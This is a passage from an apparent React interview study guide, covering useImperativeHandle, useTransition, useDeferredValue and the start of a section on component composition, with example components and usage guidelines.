you expose a controlled API while keeping implementation details private.

Basic example:
--------------

WITHOUT useImperativeHandle (full DOM exposure):

const Input = forwardRef((props, ref) => {
  return <input ref={ref} {...props} />;
});

function Parent() {
  const inputRef = useRef();
  
  const handleClick = () => {
    // Parent has full access to DOM node
    inputRef.current.focus();
    inputRef.current.select();
    inputRef.current.value = 'hello'; // Can do anything!
  };
  
  return (
    <>
      <Input ref={inputRef} />
      <button onClick={handleClick}>Focus</button>
    </>
  );
}

WITH useImperativeHandle (controlled API):

const Input = forwardRef((props, ref) => {
  const inputRef = useRef();
  
  useImperativeHandle(ref, () => ({
    // Only expose specific methods
    focus: () => {
      inputRef.current.focus();
    },
    clear: () => {
      inputRef.current.value = '';
    }
    // Don't expose: select, blur, or direct DOM access
  }));
  
  return <input ref={inputRef} {...props} />;
});

function Parent() {
  const inputRef = useRef();
  
  const handleClick = () => {
    inputRef.current.focus(); // ✅ Works
    inputRef.current.clear(); // ✅ Works
    // inputRef.current.select(); // ❌ Not available
    // inputRef.current.blur(); // ❌ Not available
  };
  
  return (
    <>
      <Input ref={inputRef} />
      <button onClick={handleClick}>Focus & Clear</button>
    </>
  );
}

Real-world examples:
--------------------

Example 1: Modal component with imperative API

const Modal = forwardRef(({ children }, ref) => {
  const [isOpen, setIsOpen] = useState(false);
  const dialogRef = useRef();
  
  useImperativeHandle(ref, () => ({
    open: () => {
      setIsOpen(true);
      // Could add animation, focus management, etc.
    },
    close: () => {
      setIsOpen(false);
    },
    toggle: () => {
      setIsOpen(prev => !prev);
    }
  }));
  
  if (!isOpen) return null;
  
  return (
    <div className="modal-backdrop">
      <div className="modal" ref={dialogRef}>
        {children}
        <button onClick={() => setIsOpen(false)}>Close</button>
      </div>
    </div>
  );
});

function App() {
  const modalRef = useRef();
  
  return (
    <div>
      <button onClick={() => modalRef.current.open()}>
        Open Modal
      </button>
      <button onClick={() => modalRef.current.toggle()}>
        Toggle Modal
      </button>
      
      <Modal ref={modalRef}>
        <h2>Modal Content</h2>
      </Modal>
    </div>
  );
}

Example 2: Video player with playback controls

const VideoPlayer = forwardRef(({ src }, ref) => {
  const videoRef = useRef();
  
  useImperativeHandle(ref, () => ({
    play: () => {
      videoRef.current.play();
    },
    pause: () => {
      videoRef.current.pause();
    },
    seek: (time) => {
      videoRef.current.currentTime = time;
    },
    setVolume: (volume) => {
      videoRef.current.volume = Math.max(0, Math.min(1, volume));
    },
    getCurrentTime: () => {
      return videoRef.current.currentTime;
    },
    getDuration: () => {
      return videoRef.current.duration;
    }
  }));
  
  return (
    <video ref={videoRef} src={src} />
  );
});

function VideoController() {
  const playerRef = useRef();
  
  return (
    <div>
      <VideoPlayer ref={playerRef} src="/video.mp4" />
      
      <div className="controls">
        <button onClick={() => playerRef.current.play()}>Play</button>
        <button onClick={() => playerRef.current.pause()}>Pause</button>
        <button onClick={() => playerRef.current.seek(0)}>Restart</button>
        <button onClick={() => playerRef.current.setVolume(0.5)}>50% Volume</button>
      </div>
    </div>
  );
}

Example 3: Form with validation API

const Form = forwardRef(({ children, onSubmit }, ref) => {
  const [errors, setErrors] = useState({});
  const fieldsRef = useRef({});
  
  useImperativeHandle(ref, () => ({
    validate: () => {
      const newErrors = {};
      
      Object.entries(fieldsRef.current).forEach(([name, field]) => {
        if (field.required && !field.value) {
          newErrors[name] = 'This field is required';
        }
      });
      
      setErrors(newErrors);
      return Object.keys(newErrors).length === 0;
    },
    reset: () => {
      Object.values(fieldsRef.current).forEach(field => {
        field.value = '';
      });
      setErrors({});
    },
    getValues: () => {
      const values = {};
      Object.entries(fieldsRef.current).forEach(([name, field]) => {
        values[name] = field.value;
      });
      return values;
    }
  }));
  
  const handleSubmit = (e) => {
    e.preventDefault();
    // Can call validate internally too
    onSubmit(fieldsRef.current);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      {children}
      {Object.entries(errors).map(([field, error]) => (
        <div key={field} className="error">{error}</div>
      ))}
    </form>
  );
});

function App() {
  const formRef = useRef();
  
  const handleExternalValidation = () => {
    if (formRef.current.validate()) {
      const values = formRef.current.getValues();
      console.log('Form is valid:', values);
    } else {
      console.log('Form has errors');
    }
  };
  
  return (
    <div>
      <Form ref={formRef} onSubmit={console.log}>
        <input name="email" type="email" required />
        <input name="password" type="password" required />
      </Form>
      
      <button onClick={handleExternalValidation}>
        Validate Externally
      </button>
      <button onClick={() => formRef.current.reset()}>
        Reset Form
      </button>
    </div>
  );
}

Example 4: Animation controller

const AnimatedBox = forwardRef((props, ref) => {
  const boxRef = useRef();
  const animationRef = useRef();
  
  useImperativeHandle(ref, () => ({
    slideIn: () => {
      boxRef.current.style.transform = 'translateX(0)';
      boxRef.current.style.opacity = '1';
    },
    slideOut: () => {
      boxRef.current.style.transform = 'translateX(100%)';
      boxRef.current.style.opacity = '0';
    },
    fadeIn: () => {
      boxRef.current.style.opacity = '1';
    },
    fadeOut: () => {
      boxRef.current.style.opacity = '0';
    },
    reset: () => {
      boxRef.current.style.transform = '';
      boxRef.current.style.opacity = '';
    }
  }));
  
  return (
    <div
      ref={boxRef}
      style={{ transition: 'all 0.3s ease' }}
      {...props}
    />
  );
});

function AnimationDemo() {
  const boxRef = useRef();
  
  return (
    <div>
      <AnimatedBox ref={boxRef}>Animated Content</AnimatedBox>
      
      <button onClick={() => boxRef.current.slideIn()}>Slide In</button>
      <button onClick={() => boxRef.current.slideOut()}>Slide Out</button>
      <button onClick={() => boxRef.current.fadeOut()}>Fade Out</button>
      <button onClick={() => boxRef.current.reset()}>Reset</button>
    </div>
  );
}

Example 5: Combining with other hooks

const DataGrid = forwardRef(({ data, columns }, ref) => {
  const [selectedRows, setSelectedRows] = useState([]);
  const [sortColumn, setSortColumn] = useState(null);
  const gridRef = useRef();
  
  useImperativeHandle(ref, () => ({
    getSelectedRows: () => selectedRows,
    clearSelection: () => setSelectedRows([]),
    selectAll: () => setSelectedRows(data.map((_, i) => i)),
    exportToCSV: () => {
      // Complex export logic
      const csv = generateCSV(data, columns);
      downloadCSV(csv);
    },
    scrollToTop: () => {
      gridRef.current.scrollTop = 0;
    }
  }), [selectedRows, data, columns]); // Dependencies!
  
  return (
    <div ref={gridRef} className="data-grid">
      {/ * Grid rendering * /}
    </div>
  );
});

function DataGridDemo() {
  const gridRef = useRef();
  
  return (
    <div>
      <div className="toolbar">
        <button onClick={() => gridRef.current.selectAll()}>
          Select All
        </button>
        <button onClick={() => gridRef.current.clearSelection()}>
          Clear Selection
        </button>
        <button onClick={() => gridRef.current.exportToCSV()}>
          Export CSV
        </button>
      </div>
      
      <DataGrid
        ref={gridRef}
        data={[/ * ... * /]}
        columns={[/ * ... * /]}
      />
    </div>
  );
}

Dependencies array:
-------------------

useImperativeHandle can have dependencies, like useEffect:

const Component = forwardRef((props, ref) => {
  const [count, setCount] = useState(0);
  
  useImperativeHandle(ref, () => ({
    getCount: () => count, // Uses count
    increment: () => setCount(c => c + 1)
  }), [count]); // ✅ Include count as dependency
  
  return <div>{count}</div>;
});

Without dependencies, the exposed methods would capture stale closure values.

When NOT to use useImperativeHandle:
-------------------------------------

❌ When declarative props would work better
❌ For simple parent-child communication (use callbacks)
❌ To bypass React's data flow without good reason
❌ When you can lift state up instead

BAD (unnecessary):

const Input = forwardRef((props, ref) => {
  const [value, setValue] = useState('');
  
  useImperativeHandle(ref, () => ({
    getValue: () => value, // ❌ Just use controlled component!
    setValue: (v) => setValue(v)
  }));
  
  return <input value={value} onChange={e => setValue(e.target.value)} />;
});

GOOD (declarative):

function Input({ value, onChange }) {
  return <input value={value} onChange={onChange} />;
}

function Parent() {
  const [value, setValue] = useState('');
  
  return <Input value={value} onChange={e => setValue(e.target.value)} />;
}

When TO use useImperativeHandle:
---------------------------------

✅ Exposing imperative methods (focus, play, pause, reset)
✅ Integrating with third-party imperative libraries
✅ Building reusable UI components with imperative APIs (modals, players, editors)
✅ When declarative approach is overly complex or impossible
✅ Encapsulating complex DOM interactions

Best practices:
---------------

1. Keep exposed API minimal:

// ❌ Bad: Expose too much
useImperativeHandle(ref, () => ({
  ...internalRef.current, // Everything!
  internalState,
  helpers
}));

// ✅ Good: Only what's needed
useImperativeHandle(ref, () => ({
  focus: () => internalRef.current.focus(),
  clear: () => internalRef.current.value = ''
}));

2. Use descriptive method names:

// ❌ Bad
useImperativeHandle(ref, () => ({
  fn1: () => {},
  fn2: () => {},
  do: () => {}
}));

// ✅ Good
useImperativeHandle(ref, () => ({
  open: () => {},
  close: () => {},
  toggle: () => {}
}));

3. Always forward ref:

// ❌ Bad: useImperativeHandle without forwardRef
function Component(props) {
  useImperativeHandle(???, () => ({})); // No ref!
}

// ✅ Good
const Component = forwardRef((props, ref) => {
  useImperativeHandle(ref, () => ({}));
});

4. Include dependencies:

// ❌ Bad: Missing dependencies
useImperativeHandle(ref, () => ({
  getState: () => state
})); // Missing [state]

// ✅ Good
useImperativeHandle(ref, () => ({
  getState: () => state
}), [state]);

5. Document the API:

/**
 * Exposed API:
 * - open(): Opens the modal
 * - close(): Closes the modal
 * - toggle(): Toggles modal visibility
 * /
const Modal = forwardRef((props, ref) => {
  useImperativeHandle(ref, () => ({
    open,
    close,
    toggle
  }));
});

Summary:

useImperativeHandle:
- Customizes ref value exposed to parent
- Used with forwardRef
- Exposes imperative API for declarative components
- Keeps internals private while exposing specific methods
- Common for modals, media players, forms, animations
- Use sparingly; prefer declarative props when possible
*/


/**
32. What is useTransition and when to use concurrent features?
--------------------------------------------------------------

useTransition is a React 18+ hook that lets you mark state updates as "transitions" 
(low-priority updates that can be interrupted), keeping the UI responsive during 
expensive operations.

Syntax:

const [isPending, startTransition] = useTransition();

- isPending: boolean indicating if a transition is in progress
- startTransition: function to wrap state updates you want to mark as transitions

What are transitions?
---------------------

Transitions are state updates that:
- Can be interrupted by more urgent updates
- Don't block the UI
- Keep the interface responsive during heavy rendering

Two types of updates in React:

1. Urgent updates:
   - Typing, clicking, hovering
   - Need immediate feedback
   - Should never be slow

2. Transitions (non-urgent updates):
   - Search results appearing
   - Filtering large lists
   - Route transitions
   - Can show stale content briefly while preparing new content

Basic example:
--------------

WITHOUT useTransition (blocking):

function SearchResults() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  
  const handleChange = (e) => {
    const value = e.target.value;
    setQuery(value); // Updates input
    
    // Expensive filtering (blocks UI)
    const filtered = hugeList.filter(item =>
      item.name.toLowerCase().includes(value.toLowerCase())
    );
    setResults(filtered); // Blocks until done
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      {/* Input feels sluggish during filtering * /}
      <ResultsList results={results} />
    </div>
  );
}

WITH useTransition (non-blocking):

function SearchResults() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  const [isPending, startTransition] = useTransition();
  
  const handleChange = (e) => {
    const value = e.target.value;
    setQuery(value); // Urgent update (immediate)
    
    startTransition(() => {
      // Non-urgent update (can be interrupted)
      const filtered = hugeList.filter(item =>
        item.name.toLowerCase().includes(value.toLowerCase())
      );
      setResults(filtered);
    });
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      {/* Input stays responsive! * /}
      
      {isPending && <div>Loading...</div>}
      <ResultsList results={results} />
    </div>
  );
}

How it works:
- Typing updates query immediately (urgent)
- Filtering results is marked as transition (non-urgent)
- If user keeps typing, React can interrupt the transition and start a new one
- UI stays responsive; input never lags

Real-world examples:
--------------------

Example 1: Tab switching with heavy content

function Tabs() {
  const [activeTab, setActiveTab] = useState('home');
  const [isPending, startTransition] = useTransition();
  
  const switchTab = (tab) => {
    startTransition(() => {
      setActiveTab(tab);
      // Even if this tab has expensive rendering, UI stays responsive
    });
  };
  
  return (
    <div>
      <div className="tabs">
        <button onClick={() => switchTab('home')}>Home</button>
        <button onClick={() => switchTab('profile')}>Profile</button>
        <button onClick={() => switchTab('settings')}>Settings</button>
      </div>
      
      {isPending && <div className="loading-indicator">Loading...</div>}
      
      <div className="tab-content" style={{ opacity: isPending ? 0.5 : 1 }}>
        {activeTab === 'home' && <HomeTab />}
        {activeTab === 'profile' && <ProfileTab />}
        {activeTab === 'settings' && <SettingsTab />}
      </div>
    </div>
  );
}

Example 2: Search with autocomplete

function SearchBox() {
  const [input, setInput] = useState('');
  const [suggestions, setSuggestions] = useState([]);
  const [isPending, startTransition] = useTransition();
  
  const handleChange = (e) => {
    const value = e.target.value;
    setInput(value); // Immediate update
    
    startTransition(() => {
      // Expensive suggestion generation
      const newSuggestions = generateSuggestions(value, hugeDatabase);
      setSuggestions(newSuggestions);
    });
  };
  
  return (
    <div>
      <input
        value={input}
        onChange={handleChange}
        placeholder="Search..."
      />
      
      {isPending && <Spinner />}
      
      <ul>
        {suggestions.map(s => (
          <li key={s.id}>{s.text}</li>
        ))}
      </ul>
    </div>
  );
}

Example 3: Filtering large data sets

function ProductList({ products }) {
  const [filterText, setFilterText] = useState('');
  const [category, setCategory] = useState('all');
  const [isPending, startTransition] = useTransition();
  
  const filteredProducts = useMemo(() => {
    return products.filter(p => {
      const matchesText = p.name.toLowerCase().includes(filterText.toLowerCase());
      const matchesCategory = category === 'all' || p.category === category;
      return matchesText && matchesCategory;
    });
  }, [products, filterText, category]);
  
  const handleFilterChange = (e) => {
    setFilterText(e.target.value); // Immediate
  };
  
  const handleCategoryChange = (newCategory) => {
    startTransition(() => {
      setCategory(newCategory); // Can be interrupted
    });
  };
  
  return (
    <div>
      <input
        value={filterText}
        onChange={handleFilterChange}
        placeholder="Filter products..."
      />
      
      <div className="categories">
        <button onClick={() => handleCategoryChange('all')}>All</button>
        <button onClick={() => handleCategoryChange('electronics')}>Electronics</button>
        <button onClick={() => handleCategoryChange('clothing')}>Clothing</button>
      </div>
      
      {isPending && <div>Updating...</div>}
      
      <div style={{ opacity: isPending ? 0.7 : 1 }}>
        {filteredProducts.map(p => (
          <ProductCard key={p.id} product={p} />
        ))}
      </div>
    </div>
  );
}

Example 4: Pagination with smooth transitions

function DataTable({ data }) {
  const [page, setPage] = useState(1);
  const [isPending, startTransition] = useTransition();
  
  const pageData = useMemo(() => {
    const start = (page - 1) * PAGE_SIZE;
    return data.slice(start, start + PAGE_SIZE);
  }, [data, page]);
  
  const goToPage = (newPage) => {
    startTransition(() => {
      setPage(newPage);
    });
  };
  
  return (
    <div>
      <table style={{ opacity: isPending ? 0.5 : 1 }}>
        {pageData.map(row => (
          <tr key={row.id}>
            <td>{row.name}</td>
            <td>{row.value}</td>
          </tr>
        ))}
      </table>
      
      <div className="pagination">
        <button onClick={() => goToPage(page - 1)} disabled={page === 1}>
          Previous
        </button>
        <span>Page {page}</span>
        <button onClick={() => goToPage(page + 1)}>
          Next
        </button>
      </div>
      
      {isPending && <LoadingBar />}
    </div>
  );
}

Concurrent features in React 18:
---------------------------------

useTransition is part of React's concurrent rendering features:

1. useTransition:
   - Manual control over transitions
   - Returns isPending state
   - Wrap updates you want to mark as transitions

2. useDeferredValue (covered next):
   - Automatic transitions for values
   - Returns deferred version of value
   - Simpler API for common cases

3. Suspense:
   - Show fallback while components load
   - Works with transitions

4. Concurrent rendering:
   - React can pause, resume, or abandon rendering work
   - Keeps UI responsive
   - Automatic in React 18 (opt-in for specific features)

When to use useTransition:
---------------------------

✅ Large list filtering/sorting
✅ Search autocomplete with many results
✅ Tab switching with heavy content
✅ Route transitions in routers
✅ Any UI update that takes >100ms to render
✅ When you need isPending state to show loading indicators

When NOT to use useTransition:
-------------------------------

❌ Simple, fast updates (overhead not worth it)
❌ Critical updates that must happen immediately
❌ Server data fetching (use Suspense instead)
❌ Form submissions (should be immediate)

useTransition vs debouncing:
----------------------------

Debouncing:
- Delays execution until user stops typing
- User sees stale data during delay
- Simple but can feel sluggish

const debouncedSearch = debounce(search, 500);
// User types → waits 500ms → sees results

useTransition:
- Starts work immediately
- Can interrupt if user keeps typing
- Shows loading state while working
- Feels more responsive

startTransition(() => search(query));
// User types → work starts immediately → can be interrupted → stays responsive

You can combine both for best results:

const handleChange = (e) => {
  const value = e.target.value;
  setInput(value); // Immediate
  
  debouncedTransition(() => {
    startTransition(() => {
      search(value); // Debounced + transition
    });
  }, 300);
};

Performance considerations:
---------------------------

useTransition has a small overhead:
- Only use for genuinely expensive updates
- For simple updates, regular setState is faster

Benchmark before using:

console.time('render');
// expensive operation
console.timeEnd('render');
// If > 100ms, consider useTransition

Combining with Suspense:
-------------------------

function App() {
  const [tab, setTab] = useState('home');
  const [isPending, startTransition] = useTransition();
  
  const switchTab = (newTab) => {
    startTransition(() => {
      setTab(newTab);
    });
  };
  
  return (
    <div>
      <TabButtons activeTab={tab} onSwitch={switchTab} />
      
      <Suspense fallback={<Spinner />}>
        <div style={{ opacity: isPending ? 0.7 : 1 }}>
          {tab === 'home' && <HomeTab />}
          {tab === 'profile' && <ProfileTab />}
        </div>
      </Suspense>
    </div>
  );
}

The transition will:
- Keep old content visible with reduced opacity (isPending)
- Load new content in background
- Show Suspense fallback if needed

Common patterns:
----------------

Pattern 1: Show stale content with loading indicator

const [isPending, startTransition] = useTransition();

return (
  <>
    {isPending && <LoadingBar />}
    <div style={{ opacity: isPending ? 0.6 : 1 }}>
      <Content />
    </div>
  </>
);

Pattern 2: Disable interactions during transition

<button
  onClick={() => startTransition(() => action())}
  disabled={isPending}
>
  {isPending ? 'Loading...' : 'Click me'}
</button>

Pattern 3: Multiple transitions

const [isPending1, startTransition1] = useTransition();
const [isPending2, startTransition2] = useTransition();

// Different transitions for different concerns
startTransition1(() => updateList());
startTransition2(() => updateChart());

Summary:

useTransition:
- Marks state updates as low-priority transitions
- Keeps UI responsive during expensive rendering
- Returns isPending boolean for loading states
- Can be interrupted by urgent updates
- Part of React 18 concurrent features
- Use for heavy computations, large list filtering, tab switching
- Combine with Suspense for data fetching
*/


/**
33. What is useDeferredValue?
-----------------------------

useDeferredValue is a React 18+ hook that lets you defer updating a value, keeping the 
UI responsive during expensive computations. It's simpler than useTransition for common 
cases where you just want to delay re-rendering with a specific value.

Syntax:

const deferredValue = useDeferredValue(value);

- value: the value you want to defer
- deferredValue: potentially "stale" version of value that lags behind

How it works:
-------------

1. On initial render, deferredValue === value
2. When value changes:
   - React re-renders immediately with old deferredValue (keeps UI responsive)
   - React schedules background update with new value
   - When background update completes, deferredValue updates
3. If value changes again during background update, React abandons old work and starts new update

Basic example:
--------------

WITHOUT useDeferredValue (blocking):

function SearchResults({ query }) {
  // Expensive filtering on every keystroke
  const results = useMemo(() => {
    return hugeList.filter(item =>
      item.name.toLowerCase().includes(query.toLowerCase())
    );
  }, [query]);
  
  return <ResultsList results={results} />;
}

function App() {
  const [query, setQuery] = useState('');
  
  return (
    <div>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      {/* Input lags while filtering * /}
      <SearchResults query={query} />
    </div>
  );
}

WITH useDeferredValue (non-blocking):

function SearchResults({ query }) {
  const deferredQuery = useDeferredValue(query);
  
  // Expensive filtering uses deferred value
  const results = useMemo(() => {
    return hugeList.filter(item =>
      item.name.toLowerCase().includes(deferredQuery.toLowerCase())
    );
  }, [deferredQuery]);
  
  return <ResultsList results={results} />;
}

function App() {
  const [query, setQuery] = useState('');
  
  return (
    <div>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      {/* Input stays responsive! * /}
      <SearchResults query={query} />
    </div>
  );
}

Now:
- User types → query updates immediately → input stays responsive
- deferredQuery lags behind, updates in background
- Results update smoothly without blocking input

Real-world examples:
--------------------

Example 1: Search with large dataset

function ProductSearch() {
  const [searchText, setSearchText] = useState('');
  const deferredSearchText = useDeferredValue(searchText);
  
  const filteredProducts = useMemo(() => {
    if (!deferredSearchText) return allProducts;
    
    return allProducts.filter(product =>
      product.name.toLowerCase().includes(deferredSearchText.toLowerCase()) ||
      product.description.toLowerCase().includes(deferredSearchText.toLowerCase())
    );
  }, [deferredSearchText]);
  
  // Show if we're behind
  const isStale = searchText !== deferredSearchText;
  
  return (
    <div>
      <input
        value={searchText}
        onChange={e => setSearchText(e.target.value)}
        placeholder="Search products..."
      />
      
      {isStale && <div className="searching">Searching...</div>}
      
      <div style={{ opacity: isStale ? 0.5 : 1 }}>
        <ProductList products={filteredProducts} />
      </div>
    </div>
  );
}

Example 2: Live preview with expensive rendering

function MarkdownEditor() {
  const [markdown, setMarkdown] = useState('');
  const deferredMarkdown = useDeferredValue(markdown);
  
  // Expensive markdown parsing and rendering
  const html = useMemo(() => {
    return parseMarkdown(deferredMarkdown);
  }, [deferredMarkdown]);
  
  const isUpdating = markdown !== deferredMarkdown;
  
  return (
    <div className="editor-layout">
      <textarea
        value={markdown}
        onChange={e => setMarkdown(e.target.value)}
        placeholder="Write markdown..."
      />
      
      <div className="preview">
        {isUpdating && <div className="updating-badge">Updating...</div>}
        <div
          style={{ opacity: isUpdating ? 0.7 : 1 }}
          dangerouslySetInnerHTML={{ __html: html }}
        />
      </div>
    </div>
  );
}

Example 3: Filtering with multiple criteria

function DataTable({ data }) {
  const [filters, setFilters] = useState({
    search: '',
    category: 'all',
    priceRange: [0, 1000]
  });
  
  const deferredFilters = useDeferredValue(filters);
  
  const filteredData = useMemo(() => {
    return data.filter(item => {
      const matchesSearch = item.name
        .toLowerCase()
        .includes(deferredFilters.search.toLowerCase());
      
      const matchesCategory =
        deferredFilters.category === 'all' ||
        item.category === deferredFilters.category;
      
      const matchesPrice =
        item.price >= deferredFilters.priceRange[0] &&
        item.price <= deferredFilters.priceRange[1];
      
      return matchesSearch && matchesCategory && matchesPrice;
    });
  }, [data, deferredFilters]);
  
  const isFiltering = filters !== deferredFilters;
  
  return (
    <div>
      <div className="filters">
        <input
          value={filters.search}
          onChange={e => setFilters({ ...filters, search: e.target.value })}
        />
        
        <select
          value={filters.category}
          onChange={e => setFilters({ ...filters, category: e.target.value })}
        >
          <option value="all">All Categories</option>
          <option value="electronics">Electronics</option>
          <option value="clothing">Clothing</option>
        </select>
      </div>
      
      {isFiltering && <ProgressBar />}
      
      <div style={{ opacity: isFiltering ? 0.6 : 1 }}>
        <Table data={filteredData} />
      </div>
    </div>
  );
}

Example 4: Chart rendering with live updates

function LiveChart({ dataStream }) {
  const [data, setData] = useState([]);
  const deferredData = useDeferredValue(data);
  
  useEffect(() => {
    const subscription = dataStream.subscribe(newPoint => {
      setData(prevData => [...prevData, newPoint]);
    });
    
    return () => subscription.unsubscribe();
  }, [dataStream]);
  
  // Expensive chart rendering
  const chartComponent = useMemo(() => {
    return <ExpensiveChart data={deferredData} />;
  }, [deferredData]);
  
  return (
    <div>
      <h3>Live Data Chart</h3>
      {chartComponent}
    </div>
  );
}

useDeferredValue vs useTransition:
-----------------------------------

useDeferredValue:
- Simpler API
- You defer a VALUE
- React decides when to update
- Good when you receive a value from props or parent state

const deferredValue = useDeferredValue(value);

useTransition:
- More control
- You defer STATE UPDATES
- You control what updates are deferred
- Returns isPending state
- Good when you own the state update

const [isPending, startTransition] = useTransition();
startTransition(() => {
  setState(newValue);
});

Choosing between them:

Use useDeferredValue when:
✅ You receive props and want to defer their use
✅ Simpler case: just want a value to lag behind
✅ Don't need granular control over pending state

function Child({ value }) {
  const deferredValue = useDeferredValue(value);
  // Use deferredValue for expensive computation
}

Use useTransition when:
✅ You own the state update
✅ Need isPending for loading indicators
✅ Want to wrap specific updates as transitions

function Parent() {
  const [value, setValue] = useState('');
  const [isPending, startTransition] = useTransition();
  
  const handleChange = (newValue) => {
    setValue(newValue); // Immediate
    startTransition(() => {
      setExpensiveValue(newValue); // Deferred
    });
  };
}

Converting between them:
-------------------------

useDeferredValue equivalent with useTransition:

// Using useDeferredValue
const deferredQuery = useDeferredValue(query);

// Roughly equivalent with useTransition
const [deferredQuery, setDeferredQuery] = useState(query);
const [isPending, startTransition] = useTransition();

useEffect(() => {
  startTransition(() => {
    setDeferredQuery(query);
  });
}, [query]);

Detecting stale values:
------------------------

Check if deferred value is behind:

function Component({ value }) {
  const deferredValue = useDeferredValue(value);
  const isStale = value !== deferredValue;
  
  return (
    <div>
      {isStale && <LoadingSpinner />}
      <div style={{ opacity: isStale ? 0.5 : 1 }}>
        <ExpensiveComponent value={deferredValue} />
      </div>
    </div>
  );
}

Performance optimization:
--------------------------

Combine with memo to skip rendering when deferred value hasn't changed:

const SlowList = memo(function SlowList({ items }) {
  // Expensive rendering
  return items.map(item => <SlowItem key={item.id} item={item} />);
});

function App() {
  const [text, setText] = useState('');
  const deferredText = useDeferredValue(text);
  
  const filteredItems = useMemo(() => {
    return items.filter(item => item.text.includes(deferredText));
  }, [deferredText]);
  
  return (
    <div>
      <input value={text} onChange={e => setText(e.target.value)} />
      {/* SlowList only re-renders when deferredText changes * /}
      <SlowList items={filteredItems} />
    </div>
  );
}

Common patterns:
----------------

Pattern 1: Search with debounce-like behavior

function Search() {
  const [query, setQuery] = useState('');
  const deferredQuery = useDeferredValue(query);
  
  return (
    <>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      <SearchResults query={deferredQuery} />
    </>
  );
}

Pattern 2: Show loading state during updates

function FilteredList({ filter }) {
  const deferredFilter = useDeferredValue(filter);
  const isStale = filter !== deferredFilter;
  
  return (
    <>
      {isStale ? <Skeleton /> : <List filter={deferredFilter} />}
    </>
  );
}

Pattern 3: Progressive enhancement

function DataVisualization({ data }) {
  const deferredData = useDeferredValue(data);
  
  // Show simple version while complex version loads
  const isStale = data !== deferredData;
  
  return isStale ? (
    <SimpleChart data={data} />
  ) : (
    <ComplexChart data={deferredData} />
  );
}

When NOT to use useDeferredValue:
----------------------------------

❌ For async operations (use Suspense instead)
❌ For simple, fast updates (unnecessary overhead)
❌ When you need precise control (use useTransition)
❌ For network requests (different pattern needed)

When TO use useDeferredValue:
------------------------------

✅ Large list filtering/searching
✅ Expensive computations based on input
✅ Live previews (markdown, code editors)
✅ Charts and visualizations with frequent updates
✅ Any rendering that takes >100ms

Combining with other hooks:
----------------------------

With useMemo:

const deferredQuery = useDeferredValue(query);

const results = useMemo(() => {
  return expensiveFilter(data, deferredQuery);
}, [data, deferredQuery]);

With useTransition:

const [query, setQuery] = useState('');
const [isPending, startTransition] = useTransition();
const deferredQuery = useDeferredValue(query);

const handleChange = (value) => {
  setQuery(value);
  startTransition(() => {
    // Additional expensive update
  });
};

With Suspense:

<Suspense fallback={<Loading />}>
  <DeferredComponent value={useDeferredValue(value)} />
</Suspense>

Summary:

useDeferredValue:
- Defers updating a value to keep UI responsive
- Simpler than useTransition for common cases
- Returns potentially stale version of value
- React updates it in background
- Can be interrupted if value changes again
- Perfect for search, filters, live previews
- Combine with useMemo for expensive computations
- Check value !== deferredValue to detect stale state
- Part of React 18 concurrent features
*/





/**
34. What is component composition?
----------------------------------

Component composition is the pattern of building complex UIs by combining smaller, 
focused components together, rather than using inheritance or building monolithic 
components.

Core principle:
Instead of one big component doing everything, build small reusable pieces and 
compose them together.

Basic composition example:
--------------------------

// ❌ Bad: Monolithic component
function UserDashboard({ user }) {
  return (
    <div className="dashboard">
      <div className="header">
        <img src={user.avatar} alt={user.name} />
        <h1>{user.name}</h1>
        <p>{user.email}</p>
      </div>
      <div className="stats">
        <div className="stat">
          <span className="label">Posts</span>
          <span className="value">{user.posts}</span>
        </div>
        <div className="stat">
          <span className="label">Followers</span>
          <span className="value">{user.followers}</span>
        </div>
      </div>
      <div className="recent-activity">
        {user.activities.map(activity => (
          <div key={activity.id} className="activity">
            <span>{activity.type}</span>
            <span>{activity.date}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ✅ Good: Composed from smaller components
function Avatar({ src, alt }) {
  return <img className="avatar" src={src} alt={alt} />;
}

function UserInfo({ name, email }) {
  return (
    <div className="user-info">
      <h1>{name}</h1>
      <p>{email}</p>
    </div>
  );
}

function Stat({ label, value }) {
  return (
    <div className="stat">
      <span className="label">{label}</span>
      <span className="value">{value}</span>
    </div>
  );
}

function Stats({ posts, followers }) {
  return (
    <div className="stats">
      <Stat label="Posts" value={posts} />
      <Stat label="Followers" value={followers} />
    </div>
  );
}

function Activity({ type, date }) {
  return (
    <div className="activity">
      <span>{type}</span>
      <span>{date}</span>
    </div>
  );
}

function ActivityList({ activities }) {
  return (
    <div className="recent-activity">
      {activities.map(activity => (
        <Activity key={activity.id} {...activity} />
      ))}
    </div>
  );
}

// Compose everything together
function UserDashboard({ user }) {
  return (
    <div className="dashboard">
      <div className="header">
        <Avatar src={user.avatar} alt={user.name} />
        <UserInfo name={user.name} email={user.email} />
      </div>
      <Stats posts={user.posts} followers={user.followers} />
      <ActivityList activities={user.activities} />
    </div>
  );
}

Benefits of composition:
- Each component has single responsibility
- Easy to test (test small pieces)
- Reusable (Avatar, Stat can be used elsewhere)
- Easier to understand and maintain

Composition patterns:
---------------------

Pattern 1: Children prop (containment)

function Card({ children }) {
  return (
    <div className="card">
      {children}
    </div>
  );
}

function App() {
  return (
    <Card>
      <h2>Title</h2>
      <p>Content goes here</p>
    </Card>
  );
}

Pattern 2: Multiple slots (named composition)

function Layout({ header, sidebar, content, footer }) {
  return (
    <div className="layout">
      <header>{header}</header>
      <div className="main">
        <aside>{sidebar}</aside>
        <main>{content}</main>
      </div>
      <footer>{footer}</footer>
    </div>
  );
}

function App() {
  return (
    <Layout
      header={<Header />}
      sidebar={<Sidebar />}
      content={<MainContent />}
      footer={<Footer />}
    />
  );
}

Pattern 3: Render props for flexibility

function DataFetcher({ url, render }) {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    fetch(url)
      .then(res => res.json())
      .then(setData);
  }, [url]);
  
  return render(data);
}

function App() {
  return (
    <DataFetcher
      url="/api/users"
      render={data => (
        data ? <UserList users={data} /> : <Loading />
      )}
    />
  );
}

Pattern 4: Specialized components

function Dialog({ title, children }) {
  return (
    <div className="dialog">
      <h2>{title}</h2>
      {children}
    </div>
  );
}

function ConfirmDialog({ onConfirm, onCancel }) {
  return (
